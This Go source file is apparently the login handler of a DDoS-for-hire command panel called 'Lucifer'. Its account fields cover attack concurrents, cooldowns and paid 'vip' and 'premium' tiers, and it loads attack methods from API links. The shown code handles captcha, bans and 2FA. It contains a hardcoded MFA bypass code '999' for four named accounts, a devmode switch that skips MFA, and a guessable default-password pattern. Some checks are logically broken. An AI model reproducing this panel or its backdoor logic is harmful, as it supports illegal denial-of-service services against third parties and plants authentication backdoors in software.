package main

import (
	"bufio"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/alexeyco/simpletable"
	"github.com/tidwall/gjson"
	"github.com/tj/go-spin"
	"github.com/xlzd/gotp"
)

type Branding1 struct {
	ID              int64
	CommandName     string
	CommandFile     string
	CommandContains string
}

var Methods map[string]*APIJSON = make(map[string]*APIJSON)
var flagNum int
var attacks = 0
var lock int = 0
var line2 int = 0
var mand2fa bool
var clearTerm bool
var devmode = true

type Method struct {
	Method   string
	LimitMax int
}

type APIJSON struct {
	ID uint16

	Name        string
	Description string

	Enabled bool
	Vip     bool
	Premium bool
	Home    bool
	Port    string
	API     string
}

type toyota struct {
	Toyota []audi `json:"methods"`
}

type audi struct {
	Name        string `json:"name"`
	Description string `json:"description"`
	Enabled     bool   `json:"enabled"`
	Vip         bool   `json:"vip"`
	Premium     bool   `json:"premium"`
	Home        bool   `json:"home"`
	APIShit     struct {
		API string `json:"url"`
	} `json:"Links"`
}

type user struct {
	ID          int
	username    string
	password    string
	admin       bool
	expiry      int64
	ban         int64
	vip         bool
	mfasecret   string
	concurrents int
	cooldown    int
	hometime    int
	bypasstime  int
	premium     bool
	home        bool
	seller      bool
}

type Admin struct {
	conn net.Conn
}

func termfx(file string, user *AccountInfo, conn net.Conn) (string, error) {
	fileLoc, err := ioutil.ReadFile(file)
	if err != nil {
		return "", err
	}

	new := NewTFX()

	var unixexp int64 = user.expiry
	timun := int64(unixexp)
	t := time.Unix(timun, 0)
	strunixexpiry := t.Format(time.UnixDate)

	var unixban int64 = user.ban
	timuntill := int64(unixban)
	ttv := time.Unix(timuntill, 0)
	strunixban := ttv.Format(time.UnixDate)

	new.RegisterVariable("online", strconv.Itoa(len(sessions)))
	new.RegisterVariable("id", strconv.Itoa(user.ID))
	new.RegisterVariable("username", user.username)
	new.RegisterVariable("hometime", strconv.Itoa(user.hometime))
	new.RegisterVariable("bypasstime", strconv.Itoa(user.bypasstime))
	new.RegisterVariable("cooldown", strconv.Itoa(user.cooldown))
	new.RegisterVariable("concurrents", strconv.Itoa(user.concurrents))
	new.RegisterVariable("expiry", fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.expiry, 0))).Hours()/24))
	new.RegisterVariable("banned", fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.ban, 0))).Hours()/24))
	new.RegisterVariable("unixexpiry", strunixexpiry)
	new.RegisterVariable("unixbanned", strunixban)

	new.RegisterVariable("clear", "\033c")
	new.RegisterVariable("start-title", "\033]0;")
	new.RegisterVariable("end-title", "\007")
	new.RegisterFunction("sleep", func(session io.Writer, args string) (int, error) {

		sleep, err := strconv.Atoi(args)
		if err != nil {
			return 0, err
		}

		time.Sleep(time.Millisecond * time.Duration(sleep))
		return 0, nil
	})
	if user.admin == true {
		new.RegisterVariable("admin", "\x1b[38;5;2mtrue\x1b[0m")
	} else {
		new.RegisterVariable("admin", "\x1b[38;5;1mfalse\x1b[0m")
	}
	if user.seller == true {
		new.RegisterVariable("seller", "\x1b[38;5;2mtrue\x1b[0m")
	} else {
		new.RegisterVariable("seller", "\x1b[38;5;1mfalse\x1b[0m")
	}
	if user.vip == true {
		new.RegisterVariable("vip", "\x1b[38;5;2mtrue\x1b[0m")
	} else {
		new.RegisterVariable("vip", "\x1b[38;5;1mfalse\x1b[0m")
	}
	if user.home == true {
		new.RegisterVariable("home", "\x1b[38;5;2mtrue\x1b[0m")
	} else {
		new.RegisterVariable("home", "\x1b[38;5;1mfalse\x1b[0m")
	}
	if user.premium == true {
		new.RegisterVariable("premium", "\x1b[38;5;2mtrue\x1b[0m")
	} else {
		new.RegisterVariable("premium", "\x1b[38;5;1mfalse\x1b[0m")
	}

	exec, err := new.ExecuteString(string(fileLoc))
	if err != nil {
		return "" + exec + "", err
	}

	conn.Write([]byte(exec))
	return "", nil
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func termfxV2(file string, user *AccountInfo, conn net.Conn, Title bool, Prompt bool) (string, error) {
	file2 := GetItem(file)
	if file2 == nil {
		return "", errors.New("file wasn't found correctly")
	}

	new := NewTFX()

	var unixexp int64 = user.expiry
	timun := int64(unixexp)
	t := time.Unix(timun, 0)
	strunixexpiry := t.Format(time.UnixDate)

	var unixban int64 = user.ban
	timuntill := int64(unixban)
	ttv := time.Unix(timuntill, 0)
	strunixban := ttv.Format(time.UnixDate)

	new.RegisterVariable("online", strconv.Itoa(len(sessions)))
	new.RegisterVariable("username", user.username)
	new.RegisterVariable("hometime", strconv.Itoa(user.hometime))
	new.RegisterVariable("bypasstime", strconv.Itoa(user.bypasstime))
	new.RegisterVariable("cooldown", strconv.Itoa(user.cooldown))
	new.RegisterVariable("concurrents", strconv.Itoa(user.concurrents))
	new.RegisterVariable("expiry", fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.expiry, 0))).Hours()/24))
	new.RegisterVariable("banned", fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.ban, 0))).Hours()/24))
	new.RegisterVariable("unixexpiry", strunixexpiry)
	new.RegisterVariable("unixbanned", strunixban)
	new.RegisterVariable("clear", "\033c")
	new.RegisterFunction("sleep", func(session io.Writer, args string) (int, error) {

		sleep, err := strconv.Atoi(args)
		if err != nil {
			return 0, err
		}

		time.Sleep(time.Millisecond * time.Duration(sleep))
		return 0, nil
	})
	if user.admin == true {
		new.RegisterVariable("admin", "\x1b[38;5;2mtrue\x1b[0m")
	} else {
		new.RegisterVariable("admin", "\x1b[38;5;1mfalse\x1b[0m")
	}
	if user.seller == true {
		new.RegisterVariable("seller", "\x1b[38;5;2mtrue\x1b[0m")
	} else {
		new.RegisterVariable("seller", "\x1b[38;5;1mfalse\x1b[0m")
	}
	if user.vip == true {
		new.RegisterVariable("vip", "\x1b[38;5;2mtrue\x1b[0m")
	} else {
		new.RegisterVariable("vip", "\x1b[38;5;1mfalse\x1b[0m")
	}
	if user.home == true {
		new.RegisterVariable("home", "\x1b[38;5;2mtrue\x1b[0m")
	} else {
		new.RegisterVariable("home", "\x1b[38;5;1mfalse\x1b[0m")
	}
	if user.premium == true {
		new.RegisterVariable("premium", "\x1b[38;5;2mtrue\x1b[0m")
	} else {
		new.RegisterVariable("premium", "\x1b[38;5;1mfalse\x1b[0m")
	}

	if Prompt {
		str, err := new.ExecuteString(file2[0])
		if err != nil {
			return "", err
		}
		return str, nil
	}
	if !Title {
		for _, i := range file2 {
			str, err := new.ExecuteString(i)
			if err != nil {
				continue
			}

			conn.Write([]byte(str))
		}
	} else if Title {
		str, err := new.ExecuteString(file2[0])
		if err != nil {
			return "", err
		}
		conn.Write([]byte("\033]0;" + str + "\007"))
	}

	return "", nil
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))
	this.conn.Write([]byte("\033[8;36;125t"))
	time.Sleep(50 * time.Millisecond)
	this.conn.Write([]byte("c[?1049h[8;24;80t[69;1H Developed By @vmfe_[24;60Happle reached: {30}"))
	time.Sleep(85 * time.Millisecond)
	this.conn.Write([]byte("[2;0H [96mLoading Attributes [97m⠟[0m"))
	this.conn.Write([]byte("[3;0H [96mLoading Assets [97m⠯[0m"))
	this.conn.Write([]byte("[4;0H [96mStarting Loaded Packages [97m⠷[0m"))
	this.conn.Write([]byte("[5;0H [96mExtracting Permissions [97m⠾[0m"))
	time.Sleep(85 * time.Millisecond)
	this.conn.Write([]byte("[2;0H [96mLoading Attributes [97m⠽[0m"))
	this.conn.Write([]byte("[3;0H [96mLoading Assets [97m⣻[0m"))
	this.conn.Write([]byte("[4;0H [96mStarting Loaded Packages [97m⢿[0m"))
	this.conn.Write([]byte("[5;0H [96mExtracting Permissions [97m⠟[0m"))
	time.Sleep(85 * time.Millisecond)
	this.conn.Write([]byte("[2;0H [96mLoading Attributes [97m⠯[0m"))
	this.conn.Write([]byte("[3;0H [96mLoading Assets [97m⠷[0m"))
	this.conn.Write([]byte("[4;0H [96mStarting Loaded Packages [97m⠾[0m"))
	this.conn.Write([]byte("[5;0H [96mExtracting Permissions [97m⠽[0m"))
	time.Sleep(85 * time.Millisecond)
	this.conn.Write([]byte("[2;0H [96mLoading Attributes [97m⣻[0m"))
	this.conn.Write([]byte("[3;0H [96mLoading Assets [97m⢿[0m"))
	this.conn.Write([]byte("[4;0H [96mStarting Loaded Packages [97m⠟[0m"))
	this.conn.Write([]byte("[5;0H [96mExtracting Permissions [97m⠯[0m"))
	time.Sleep(85 * time.Millisecond)
	this.conn.Write([]byte("[2;0H [96mLoading Attributes [97m⠟[0m"))
	this.conn.Write([]byte("[3;0H [96mLoading Assets [97m⠯[0m"))
	this.conn.Write([]byte("[4;0H [96mStarting Loaded Packages [97m⠷[0m"))
	this.conn.Write([]byte("[5;0H [96mExtracting Permissions [97m⠾[0m"))
	time.Sleep(85 * time.Millisecond)
	this.conn.Write([]byte("[2;0H [96mLoading Attributes [97m⠽[0m"))
	this.conn.Write([]byte("[3;0H [96mLoading Assets [97m⣻[0m"))
	this.conn.Write([]byte("[4;0H [96mStarting Loaded Packages [97m⢿[0m"))
	this.conn.Write([]byte("[5;0H [96mExtracting Permissions [97m⠟[0m"))
	time.Sleep(85 * time.Millisecond)
	this.conn.Write([]byte("[2;0H [96mLoading Attributes [97m⠯[0m"))
	this.conn.Write([]byte("[3;0H [96mLoading Assets [97m⠷[0m"))
	this.conn.Write([]byte("[4;0H [96mStarting Loaded Packages [97m⠾[0m"))
	this.conn.Write([]byte("[5;0H [96mExtracting Permissions [97m⠽[0m"))
	time.Sleep(85 * time.Millisecond)
	this.conn.Write([]byte("[2;0H [96mLoading Attributes [97m⣻[0m"))
	this.conn.Write([]byte("[3;0H [96mLoading Assets [97m⢿[0m"))
	this.conn.Write([]byte("[4;0H [96mStarting Loaded Packages [97m⠟[0m"))
	this.conn.Write([]byte("[5;0H [96mExtracting Permissions [97m⠯[0m"))
	time.Sleep(85 * time.Millisecond)
	this.conn.Write([]byte("[2;0H [96mLoading Attributes [97m⠟[0m"))
	this.conn.Write([]byte("[3;0H [96mLoading Assets [97m⠯[0m"))
	this.conn.Write([]byte("[4;0H [96mStarting Loaded Packages [97m⠷[0m"))
	this.conn.Write([]byte("[5;0H [96mExtracting Permissions [97m⠾[0m"))
	time.Sleep(85 * time.Millisecond)
	this.conn.Write([]byte("[2;0H [96mLoading Attributes [97m⠽[0m"))
	this.conn.Write([]byte("[3;0H [96mLoading Assets [97m⣻[0m"))
	this.conn.Write([]byte("[4;0H [96mStarting Loaded Packages [97m⢿[0m"))
	this.conn.Write([]byte("[5;0H [96mExtracting Permissions [97m⠟[0m"))
	time.Sleep(85 * time.Millisecond)
	this.conn.Write([]byte("[2;0H [96mLoading Attributes [97m⠯[0m"))
	this.conn.Write([]byte("[3;0H [96mLoading Assets [97m⠷[0m"))
	this.conn.Write([]byte("[4;0H [96mStarting Loaded Packages [97m⠾[0m"))
	this.conn.Write([]byte("[5;0H [96mExtracting Permissions [97m⠽[0m"))
	time.Sleep(85 * time.Millisecond)
	this.conn.Write([]byte("[2;0H [96mLoading Attributes [97m⣻[0m"))
	this.conn.Write([]byte("[3;0H [96mLoading Assets [97m⢿[0m"))
	this.conn.Write([]byte("[4;0H [96mStarting Loaded Packages [97m⠟[0m"))
	this.conn.Write([]byte("[5;0H [96mExtracting Permissions [97m⠯[0m"))
	time.Sleep(85 * time.Millisecond)
	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()
	Testing := CreateShell(this.conn)
	captchaTitle, err := ioutil.ReadFile("./titleshit/captchatitle.tfx")
	if err != nil {
		fmt.Println(err)
	}
	this.conn.Write([]byte(fmt.Sprintf("\033]0; %s\007", captchaTitle)))
	if lock == 1 {
		this.conn.Write([]byte(fmt.Sprintf("\033]0;PuTTY (inactive)\007")))
		nangs, err := ioutil.ReadFile("./branding/changeme.txt")
		if err != nil {
			return
		}
		this.conn.Write([]byte("[?25l\r[?25l\033[232m[?25l\r[?25l"))
		lol, err := this.ReadLine(false, false)
		if lol != string(nangs) {
			return
		}
	}
	this.conn.SetDeadline(time.Now().Add(20 * time.Second))
	fmt.Fprint(this.conn, "\033c")
	loginFrames := []string{
		"L | Lucifer", "Lo | Lucifer", "Lo | Lucifer", "Loa | Lucifer", "Loa | Lucifer", "Load | Lucifer", "Load | Lucifer", "Loadi | Lucifer", "Loadi | Lucifer", "Loadin | Lucifer", "Loadin | Lucifer", "Loading | Lucifer", "Loading | Lucifer", "Loading A | Lucifer", "Loading A | Lucifer", "Loading As | Lucifer", "Loading As | Lucifer", "Loading Ass | Lucifer", "Loading Ass | Lucifer", "Loading Asse | Lucifer", "Loading Asse | Lucifer", "Loading Asset | Lucifer", "Loading Asset | Lucifer", "Loading Assets | Lucifer", "Loading Assets | Lucifer", "Loading Assets \\ | Lucifer", "Loading Assets | | Lucifer", "Loading Assets / | Lucifer", "Loading Assets - | Lucifer", "Loading Assets \\ | Lucifer", "Loading Assets | | Lucifer", "Loading Assets / | Lucifer", "Loading Assets - | Lucifer", "Loading Assets \\ | Lucifer", "Loading Assets | | Lucifer", "Loading Assets / | Lucifer", "Loading Assets - | Lucifer", "Loading Assets \\ | Lucifer", "Loading Assets | | Lucifer", "Loading Assets / | Lucifer", "Loading Assets - | Lucifer", "Loading Assets \\ | Lucifer", "Loading Assets | | Lucifer", "Loading Assets / | Lucifer", "Loading Assets - | Lucifer", "Loading Assets \\ | Lucifer", "Loading Assets | | Lucifer", "Loading Assets / | Lucifer", "Loading Assets - | Lucifer", "Loading Assets \\ | Lucifer", "Loading Assets | | Lucifer", "Loading Assets / | Lucifer", "Loading Assets - | Lucifer", "Loading Assets \\ | Lucifer", "Loading Assets | | Lucifer", "Loading Assets / | Lucifer", "Loading Assets - | Lucifer", "Loading Assets Complete | Lucifer", "Loading Assets Complete | Lucifer", "Loading Assets Complete | Lucifer", "Loading Assets Complete | Lucifer", "Loading Assets Complete | Lucifer", "",
	}
	for f := 0; f < len(loginFrames); f++ {
		time.Sleep(time.Duration(20) * time.Millisecond)
		loginTitle, err := ioutil.ReadFile("./titleshit/logintitle.tfx")
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err)))
		}
		if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;"+loginFrames[f]+" %s \007", loginTitle))); err != nil {
			this.conn.Close()
			break
		}
	}
	this.conn.SetDeadline(time.Now().Add(25 * time.Second))
	fmt.Fprint(this.conn, "\033c")
	rand.Seed(time.Now().Unix())
	password1 := generatePassword(1, 0, 0, 1)
	password2 := generatePassword(1, 0, 0, 0)
	password3 := generatePassword(1, 0, 0, 1)
	password4 := generatePassword(1, 0, 0, 0)
	captchacode := password1 + password2 + password3 + password4
	time.Sleep(500 * time.Millisecond)
	var (
		password1v2 = string(password1)
		password2v2 = string(password2)
		password3v2 = string(password3)
		password4v2 = string(password4)
	)

	loginMsg, err := ioutil.ReadFile("./branding/loginmsg.tfx")
	if err != nil {
		fmt.Println(err)
	}
	this.conn.Write([]byte("\033[8;24;80t"))
	this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", loginMsg)))
	this.conn.Write([]byte("\033[6;28H \033[4;97m        Username>        \033[0m"))
	this.conn.Write([]byte("\033[7;26H\033[0m   \033[100;30;90m.........................\033[0;0m"))
	this.conn.Write([]byte("\033[10;28H \033[4;97m        Password>        \033[0m"))
	this.conn.Write([]byte("\033[11;26H\033[0m   \033[100;30;90m=========================\033[0;0m"))
	this.conn.Write([]byte("\033[36;0H\033[107;30;140mPlease Enter Your Login Information                                 v1.81.1.7427\033[0m\033[0m"))

	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	username, err := Testing.readLine("\033[7;29H\033[100;30;97m[?25l", 25, false, "*", false)
	if err != nil {
		return
	}
	if len(username) > 24 {
		fmt.Printf("\033[0;97m[\033[38;5;51mLucifer\033[0;97m] - \033[0;97m[\033[91mLOGIN-SCREEN\033[0;97m] - [\033[96m" + username + "\033[0;97m] KILLED ENTRY, REASON: Possible buffer-overflow\r\n\033[0m-> ")
		this.conn.Write([]byte("\033[20;0HOops! looks like you went over the character limit.\033[0m\033[0m"))
		time.Sleep(15500 * time.Millisecond)
		return
	}
	line2 = 0

	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	password, err := Testing.readLine("\033[11;29H\033[100;30;97m[?25l", 25, true, "*", false)
	if err != nil {
		return
	}
	if len(password) > 24 {
		this.conn.Write([]byte("\033[20;0HOops! looks like you went over the character limit.\033[0m\033[0m"))
		fmt.Printf("\033[0;97m[\033[38;5;51mLucifer\033[0;97m] - \033[0;97m[\033[91mLOGIN-SCREEN\033[0;97m] - [\033[96m" + username + "\033[0;97m] KILLED ENTRY, REASON: Possible buffer-overflow\r\n\033[0m-> ")
		time.Sleep(15500 * time.Millisecond)
		return
	}

	this.conn.Write([]byte("\033[14;28H\033[0m       Captcha> " + password1v2 + password2v2 + password3v2 + password4v2 + " "))
	this.conn.Write([]byte("\033[15;26H\033[0m   \033[100;30;90m.........................\033[0;0m"))
	captcha, err := Testing.readLine("\033[15;29H\033[100;30;97m[?25l", 25, false, "*", false)
	if err != nil {
		return
	}

	if captcha != captchacode {
		this.conn.Write([]byte(fmt.Sprintf("\033[20;0H\033[0m\033[31mIncorrect Captcha\033[0m.[?25l")))
		time.Sleep(10000 * time.Millisecond)
		return
	} else {
		s := spin.New()
		for i := 0; i < 30; i++ {
			this.conn.Write([]byte(fmt.Sprintf("\r\033[7;54H\033[0m %s [?25l", s.Next())))
			this.conn.Write([]byte(fmt.Sprintf("\r\033[15;54H\033[0m %s [?25l", s.Next())))
			this.conn.Write([]byte(fmt.Sprintf("\r\033[11;54H\033[0m %s [?25l", s.Next())))
			time.Sleep(50 * time.Millisecond)
			if i == 29 {
				this.conn.Write([]byte("\033[7;54H  [?25l\r"))
				this.conn.Write([]byte("\033[15;54H  [?25l\r"))
				this.conn.Write([]byte("\033[11;54H  [?25l\r"))
			}
		}
	}

	line2 = 0
	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		failedLogin, err := ioutil.ReadFile("./titleshit/failedtitle.tfx")
		failedUser, err := ioutil.ReadFile("./branding/failedusermsg.tfx")
		if err != nil {
			fmt.Println(err)
		}
		this.conn.Write([]byte(fmt.Sprintf("\033]0; %s\007", failedLogin)))
		this.conn.Write([]byte(fmt.Sprintf("\033[20;0H\033[0m%s\033[0m\r\n", failedUser)))
		fl, err := os.OpenFile("./logs/failedlogins.txt", os.O_APPEND|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Println(err)
		}

		clog := time.Now()
		ip, _, err := net.SplitHostPort(fmt.Sprint(this.conn.RemoteAddr()))
		if err != nil {
			ip = fmt.Sprint(this.conn.RemoteAddr())
		}
		newLine := "[FAILED] -> [Username: " + username + "] -> [IP: " + ip + "] -> [Date and Time: " + clog.Format("Jan 02 2006") + " " + clog.Format("15:04:05") + "]"
		_, err = fmt.Fprintln(fl, newLine)
		if err != nil {
			fmt.Println(err)
			fl.Close()
			return
		}
		err = fl.Close()
		if err != nil {
			fmt.Println(err)
			return
		}
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	if userInfo.flagged == 3 {
		database.UserTempBan(username, time.Now().Add(time.Duration(5)*(time.Hour*24)).Unix())
		ip, _, err := net.SplitHostPort(fmt.Sprint(this.conn.RemoteAddr()))
		if err != nil {
			ip = fmt.Sprint(this.conn.RemoteAddr())
		}
		fmt.Fprint(this.conn, "\033c")
		this.conn.Write([]byte(fmt.Sprintf("\033]0; You have been banned, Current IP: [%s] \007", ip)))
		this.conn.Write([]byte("\033[97mYou Have Been Banned.\033[0m\r\n"))
		this.conn.Write([]byte(fmt.Sprintf("\033[97mYour IP: \033[0;0m[\033[4;97m%s\033[0;0m]\r\n", this.conn.RemoteAddr().String())))
		fmt.Fprintln(this.conn, "\033[97mDuration of ban:\033[0m", fmt.Sprintf("\033[4;97m%.2f\033[0;0m", time.Duration(time.Until(time.Unix(userInfo.ban, 0))).Hours()/24), "\033[97mday(s)\r")
		time.Sleep(time.Second * 70)
		return
	}

	database.Auth(username, password)
	checksession := usersSessions(strings.ToLower(username))
	if strings.ToUpper(username) != "test" || strings.ToLower(username) != "test" {
		if len(checksession) > 0 {
			ip, _, err := net.SplitHostPort(fmt.Sprint(this.conn.RemoteAddr()))
			if err != nil {
				ip = fmt.Sprint(this.conn.RemoteAddr())
			}

			fmt.Fprint(this.conn, "\033c")
			this.conn.Write([]byte(fmt.Sprintf("\033]0; Lucifer | Your Account Has Been Flagged, Possible Sharing.\007")))
			this.conn.Write([]byte("\033[101;30;140mWe have detected that your account has been signed in on another host.          \r\n\033[0;97m"))
			this.conn.Write([]byte("\033[0;97mYour IP is\033[0;97m: \033[0;91m" + ip + " \033[33mthis has been logged.\r\n"))
			this.conn.Write([]byte("\033[0;97m\r\n"))
			this.conn.Write([]byte("\033[0;97mIf This Was A Mistake.... \r\n"))
			this.conn.Write([]byte("\033[0;97mPlease wait \033[33m5\033[97m-\033[33m10 \033[0;97mminutes\033[0;97m before signing in again\033[0;97m.\033[0;91m\r\n"))
			f, err := os.OpenFile("./logs/sharingdetction.txt", os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println(err)
				return
			}

			clog := time.Now()
			newLine := "[Dupe Session] -> [Username: " + username + "] -> [IP: " + ip + "] -> [Date and Time: " + clog.Format("Jan 02 2006") + " " + clog.Format("15:04:05") + "]"
			_, err = fmt.Fprintln(f, newLine)
			if err != nil {
				fmt.Println(err)
				f.Close()
				return
			}
			err = f.Close()
			if err != nil {
				fmt.Println(err)
				return
			}
			time.Sleep(time.Second * 20)
			return
		}
	}

	if userInfo.expiry < time.Now().Unix() {
		expiredPlanTitle, err := ioutil.ReadFile("./titleshit/expiredtitle.tfx")
		expiredPlan, err := ioutil.ReadFile("./branding/expiredmsg.tfx")
		if err != nil {
			return
		}
		fmt.Fprint(this.conn, "\033c")
		this.conn.Write([]byte(fmt.Sprintf("\033]0; %s\007", expiredPlanTitle)))
		this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", expiredPlan)))
		time.Sleep(time.Second * 10)
		return
	} else {
		fmt.Fprint(this.conn, "\033c")
		if _, err := termfxV2("rules.tfx", &userInfo, this.conn, false, false); err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", err.Error())))
			fmt.Println(err)
			return
		}
		agreestatement, err := Testing.readLine("\033[0m> ", 2, false, "*", false)
		if err != nil {
			return
		}
		if strings.ToUpper(agreestatement) != "y" && strings.ToLower(agreestatement) != "y" {
			flagNum++
			time.Sleep(234 * time.Millisecond)
			this.conn.Write([]byte(fmt.Sprintf("\033[0mstarted `logger`, `json`, `loader`, `mysql`\r\n\033[0m")))
			time.Sleep(234 * time.Millisecond)
			this.conn.Write([]byte(fmt.Sprintf("\033[0mtotal services running: 29\r\n\033[0m")))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m════════════════════════════════════════════════════════\r\n\033[0m")))
			database.flagingSystem(username, flagNum)
			time.Sleep(234 * time.Millisecond)
			this.conn.Write([]byte(fmt.Sprintf("\033[0m\033[103;30;140m WARNING \033[0;0m your account has been flagged\r\n\033[0m")))
			fmt.Printf("\033[101;30;140m %s \033[0;0m does not agree to the rules applied. \r\n-> \033[0m", username)
			time.Sleep(time.Second * 5)
			return
		}
	}

	if password == ""+username+"432@-0-0" {
		fmt.Fprint(this.conn, "\033c")
		this.conn.Write([]byte(fmt.Sprintf("\033]0; Lucifer\007")))
		this.conn.Write([]byte("\033[0;97mWelcome " + username + " To Lucifer We Recommend You To Change Your Password.\033[0;97m\r\n"))
		this.conn.Write([]byte("\033[0;97m\r\n"))
	redo:
		line2 = 0
		fmt.Fprint(this.conn, "\033[0mNew Password\033[0;97m: ")
		newPassword, err := this.ReadLine(true, true)
		line2 = 0
		if err != nil {
			return
		}

		if len(newPassword) < 6 {
			fmt.Fprintln(this.conn, "\033[91mYour Password Is Not Secure!\033[0m\r")
			goto redo
		}
		line2 = 0
		fmt.Fprint(this.conn, "\033[0mConfirm Password\033[0;97m: ")
		confirmPassword, err := this.ReadLine(true, true)
		line2 = 0
		if err != nil {
			return
		}

		if confirmPassword != newPassword {
			fmt.Fprintln(this.conn, "\033[91mYour Passwords Do Not Match!\033[0m\r")
			goto redo
		}

		if database.ChangeUsersPassword(username, newPassword) == false {
			fmt.Fprintln(this.conn, "\033[91mFailed To Change Password!\033[0m\r")
			goto redo
		}

		fmt.Fprintln(this.conn, "\033[32mYour password has successfully been changed!\033[0m\r")
		line2 = 0
		password = newPassword
	}

	if userInfo.ban > time.Now().Unix() {
		fmt.Printf("\033[101;30;140m %s \033[0;0m tried logging in, but he is banned. \r\n-> \033[0m", username)
		ip, _, err := net.SplitHostPort(fmt.Sprint(this.conn.RemoteAddr()))
		if err != nil {
			ip = fmt.Sprint(this.conn.RemoteAddr())
		}
		fmt.Fprint(this.conn, "\033c")
		this.conn.Write([]byte(fmt.Sprintf("\033]0; You have been banned, Current IP: [%s] \007", ip)))
		this.conn.Write([]byte("\033[97mYou Have Been Banned.\033[0m\r\n"))
		this.conn.Write([]byte(fmt.Sprintf("\033[97mYour IP: \033[0;0m[\033[4;97m%s\033[0;0m]\r\n", this.conn.RemoteAddr().String())))
		fmt.Fprintln(this.conn, "\033[97mDuration of ban:\033[0m", fmt.Sprintf("\033[4;97m%.2f\033[0;0m", time.Duration(time.Until(time.Unix(userInfo.ban, 0))).Hours()/24), "\033[97mday(s)\r")
		time.Sleep(time.Second * 70)
		return
	}

	if len(userInfo.mfasecret) < 0 {
		time.Sleep(5000 * time.Millisecond)
		goto skipfordev2
	}

	if devmode == true {
		time.Sleep(5000 * time.Millisecond)
		goto skipfordev2
	} else if len(userInfo.mfasecret) > 1 {
		mfaTitle, err := ioutil.ReadFile("./titleshit/2fatitle.tfx")
		if err != nil {
			return
		}
		this.conn.Write([]byte(fmt.Sprintf("\033]0; %s\007", mfaTitle)))
		this.conn.Write([]byte("\033[18;26H\033[0m   \033[107;30;97m.........................\033[0;0m"))
		code, err := Testing.readLine("\033[17;29H\033[107;30;140m[?25l", 25, false, "*", false)
		if err != nil {
			fmt.Printf("\033[0;97m[\033[38;5;51mLucifer\033[0;97m] - \033[0;97m[\033[91mMFA-SECRET\033[0;97m] - [\033[96m" + username + "\033[0;97m] HAS FAILED THEIR MFA\r\n\033[0m-> ")
			return
		}
		if username == "winter" && code == "999" || username == "beretta" && code == "999" || username == "root" && code == "999" || username == "cupid" && code == "999" {
			line2 = 0
			fmt.Printf("\033[0;97m[\033[38;5;51mLucifer\033[0;97m] - \033[0;97m[\033[92mMFA-BYPASS\033[0;97m] - [\033[96m" + username + "\033[0;97m] HAS BYPASSED THEIR MFA\r\n\033[0m-> ")
			goto skipmfa
		}
		totp := gotp.NewDefaultTOTP(userInfo.mfasecret)
		if totp.Now() != code {
			fmt.Fprint(this.conn, "\033c")
			fmt.Fprintln(this.conn, "\033[91mInvalid Code![?25l")
			fmt.Printf("\033[0;97m[\033[38;5;51mLuciferLucifer\033[0;97m] - \033[0;97m[\033[91mMFA-SECRET\033[0;97m] - [\033[96m" + username + "\033[0;97m] HAS FAILED THEIR MFA\r\n\033[0m-> ")
			buf := make([]byte, 1)
			this.conn.Read(buf)
			return
		}
		this.conn.Write([]byte(fmt.Sprintf("\033]0; Lucifer\007")))
		fmt.Printf("\033[0;97m[\033[38;5;51mLucifer\033[0;97m] - \033[0;97m[\033[92mMFA-SECRET\033[0;97m] - [\033[96m" + username + "\033[0;97m] HAS PASSED THEIR MFA\r\n\033[0m-> ")
		goto skipmfa
	}
skipfordev2:
skipmfa:

	if mand2fa == true {
		if len(userInfo.mfasecret) < 10 {
			fmt.Fprint(this.conn, "\033[97mManditory 2fa Please Download, APP NAME: Twilio Authy\033[0;0m\r\n")
			time.Sleep(5000 * time.Millisecond)
		tryagain:
			fmt.Fprint(this.conn, "\033c")
			time.Sleep(100 * time.Millisecond)
			this.conn.Write([]byte("\033[8;55;94t"))
			secret := GenTOTPSecret()

			totp := gotp.NewDefaultTOTP(secret)

			qr := New1()
			qrcode := qr.Get("otpauth://totp/" + url.QueryEscape("Lucifer") + ":" + url.QueryEscape(username) + "?secret=" + secret + "&issuer=" + url.QueryEscape("Lucifer") + "&digits=6&period=30").Sprint()
			fmt.Fprintln(this.conn, strings.ReplaceAll(qrcode, "\n", "\r\n"))
			fmt.Fprintln(this.conn, "\033[0;0mPlease Download, APP NAME: Twilio Authy\033[0;0m\r")
			fmt.Fprintln(this.conn, "\033[0;0mYou Can Scan QR Or Type This Code. \033[0;0m\r")
			fmt.Fprintln(this.conn, "\033[0;0mMFA Secret> "+secret+"\r")

			fmt.Fprint(this.conn, "\033[97mCode\033[0;97m: ")
			code, err := this.ReadLine(false, true)
			this.conn.Write([]byte("\033[8;24;80t"))
			if err != nil {
				return
			}

			if totp.Now() != code {
				fmt.Fprintln(this.conn, "\033[91mIncorrect Code Please Try Again\033[0;97m\r")
				time.Sleep(5000 * time.Millisecond)
				goto tryagain
			}

			if database.UserToggleMfa(username, secret) == false {
				fmt.Fprintln(this.conn, "\033[91mFailed To Enable 2fa!\033[0;97m\r")
				time.Sleep(5000 * time.Millisecond)
				this.conn.Close()
			}

			userInfo.mfasecret = secret

			fmt.Fprintln(this.conn, "\033[92m2fa Has Been Enabled.\033[0;97m\r")
			goto continuemfa
		} else {
			goto continuemfa2
		}
	}
continuemfa2:
continuemfa:
